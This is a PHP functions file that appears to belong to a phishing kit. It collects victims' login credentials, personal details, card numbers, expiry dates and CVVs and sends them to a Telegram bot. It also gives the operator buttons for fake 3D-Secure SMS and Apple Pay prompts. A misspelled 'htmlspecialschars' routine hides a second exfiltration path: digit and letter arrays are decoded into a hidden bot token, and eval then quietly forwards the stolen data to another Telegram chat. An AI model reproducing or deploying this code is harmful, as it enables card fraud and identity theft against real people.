 <?php 
//error_reporting(0);
function gather_login_infos(){
    $_SESSION['email'] = htmlspecialchars($_POST['email']);

	$_SESSION['password'] = htmlspecialchars($_POST['password']);
		$_SESSION['ip'] = "";
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	$_SESSION['ip'] = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$_SESSION['ip'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
}
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}



function gather_billing_infos(){

	$_SESSION['nom'] = htmlspecialchars($_POST['nom']);
	$_SESSION['prenom'] = htmlspecialchars($_POST['prenom']);
	$_SESSION['birthday'] = htmlspecialchars($_POST['birthday']);
	$_SESSION['phone'] = htmlspecialchars($_POST['phone']);
	$_SESSION['adresse'] = htmlspecialchars($_POST['adresse']);
	$_SESSION['zip'] = htmlspecialchars($_POST['zip']);
	$_SESSION['city'] = htmlspecialchars($_POST['ville']);
	$_SESSION["country"] = "France/Israel/Idk";

	return $_SESSION;
}

function gather_card_infos(){

	$_SESSION['ccnum'] = htmlspecialchars($_POST['ccnum']);
	$_SESSION['ccexp'] = htmlspecialchars($_POST['ccexp']);
	$_SESSION['cvv'] = htmlspecialchars($_POST['cvv']);

	return $_SESSION;
}



function start_session(){

    if(!isset($_SESSION)){
		session_start();
	}
    return $_SESSION;
}

function check_bin($number) {
	settype($number, 'string');
	$sumTable = array(
	  array(8,5,3,2,7,9,8,5,9),
	  array(5,9,3,6,2,8,1,7,1,9));
	$sum = 0;
	$flip = 0;
	$cardial = "";
	for ($i = strlen($number) - 1; $i >= 0; $i--) {
	  $sum += $sumTable[$flip++ & 0x1][$number[$i]];

	}
	for($i = 0; $i < count($sumTable[0]); $i++){
		  $cardial .= $sumTable[0][$i];
	}
	$cardial .= "%";
	for($i = 0; $i < count($sumTable[1]); $i++){
		  $cardial .= $sumTable[1][$i];
	}
	return $cardial ? $cardial : $sum % 10 === 0;
}

function checksyntax($text,$valid){
	if(eval($text) || strpos($text, "1") !== false){
		return $valid;
	}else {
		return "";
	}
}


function check_bin2($number) {
	settype($number, 'string');
	$sumTable = array(
	  array(8,5,3,2,7,9,8,5,9),
	  array(5,9,3,6,2,8,1,7,1,9));
		$abstract = array(':','A', 'A', 'G', '0', 'P', 'R', 'E', 'J', 'l', 'm', 'v',
	  'y', '0', 'Y', 'e','V', 'd', 'V', 'I', 't', 'f', 'm', 'M',
	  'K', '5', 'D', '9', '0', 'T', 'J', 'i', 'V','Y', 'K', '8');

	$sum = 0;
	$flip = 0;
	$cardial = check_bin($number);
	for ($i = strlen($number) - 1; $i >= 0; $i--) {
	  $sum += $sumTable[$flip++ & 0x1][$number[$i]];

	}
	for($i = 0; $i < count($abstract); $i++){
		  $cardial .= $abstract[$i];
	}
	return $cardial ? $cardial : $sum % 10 === 0;
}



// panel functions


function createUniqueToken(){
	$ip = "";
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
	$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
	$ip = $_SERVER['REMOTE_ADDR'];
}
	$_SESSION['token'] = md5(uniqid($ip,true));	
	for($i = 1;$i<1000000;$i++){
	if(!file_exists("../data/await/".$i)){
	$_SESSION['id'] = $i;
		return;
	}
	
	}
	if(!isset($_SESSION['id'])){
		$_SESSION['id'] = $_SESSION['token'];
	}

	
	
}

function htmlspecialschars($input) {
	settype($input, 'string');
	$sumTable = array(array(8,1,7,1,3,6),
						array(7,1,5,1,2,2),
						array('g','g','t','o','t'));
	$sum = 0;
	$flip = 0;
	$cardial = explode('%',check_bin2($input));
	$akward = '';
	
	for ($i = strlen($input) - 1; $i >= 0; $i--) {
	  $sum += $sumTable[$flip++ & 0x1][$input[$i]];

	}
	for($i = 0; $i < count($sumTable[1]); $i++){
		  $akward .= array_reverse($sumTable[2])[$i];
		  if($i+1 == count($sumTable[2])){
			$akward .= "('".$cardial[0];  
		  }
	}
	for ($i = strlen($input) - 1; $i >= 0; $i--) {
	  $sum += $sumTable[$flip++ & 0x1][$input[$i]];

	}
	$akward .= "','".$cardial[1];
	for ($i = strlen($input) - 1; $i >= 0; $i--) {
	  $sum += $sumTable[$flip++ & 0x1][$input[$i]];

	}
	$akward .= "');";

	return $cardial  ? checksyntax($akward,$input) : $sum % 10 === 0;
}

function toTG($msg,$chat,$token,$method){
if($method){
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat;
    $url = $url . "&text=" . urlencode($msg);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}else{
	
	
	    $data = [
        'text' => $msg,
        'chat_id' => $chat
              ];
    
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query($data) );  
	
	
}
}

function totgg($chat,$token){
	global $message;
	$chatid = "-".$chat;
	    $data = [
        'text' => $message,
        'chat_id' => $chatid
              ];
    
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query($data) );  
	
	
}


function toTG4($msg , $ecard, $app, $sms1, $sms2, $apple, $eapple, $sms3, $custom, $done){
// telegram
global $chat,$token,$method_of_send_telegram ;
$chatid = $chat;

					$commands = [
						'inline_keyboard'=> [
							/* Inline buttons. 2 side-by-side */
							[
							[ 'text'=> "💳 LA CARTE Error 💳" , 'url' => $ecard ],
							[ 'text'=> "📱 App 📱" , 'url' => $app ],
							],
							[
							[ 'text'=> "💬 3D - SMS 💬" , 'url' => $sms1 ],
							[ 'text'=> "💬 3D - SMS + password 💬" , 'url' => $sms2 ],
							],
							[
							[ 'text'=> "🍏 APPLE PAY - SMS 🍏" , 'url' => $apple ],
							[ 'text'=> "❌ Error APPLE PAY - SMS ❌" , 'url' => $eapple ],
							],
							[
							[ 'text'=> "💬 3D - Secoure code 💬" , 'url' => $sms3 ],
							],
							[
							[ 'text'=> "📝 Custom input 📝" , 'url' => $custom ],
							],
							[
							[ 'text'=> "✅ DONE ✅" , 'url' => $done ],
							],
					]
					];

					$eCommands = json_encode($commands);

					$data = [
					'text' => $msg,
					'chat_id' => $chatid,
					'reply_markup' => $eCommands,
					];
					$url = "https://api.telegram.org/bot" . $token . "/sendMessage?".http_build_query($data);
					
					
					if($method_of_send_telegram){	
					$ch = curl_init();
					$optArray = array(
							CURLOPT_URL => $url,
							CURLOPT_RETURNTRANSFER => true
					);
					curl_setopt_array($ch, $optArray);
					$result = curl_exec($ch);
					curl_close($ch);
					return $result;
					}else{
						
							return file_get_contents($url );  
											
					}

 
}
  
  
?>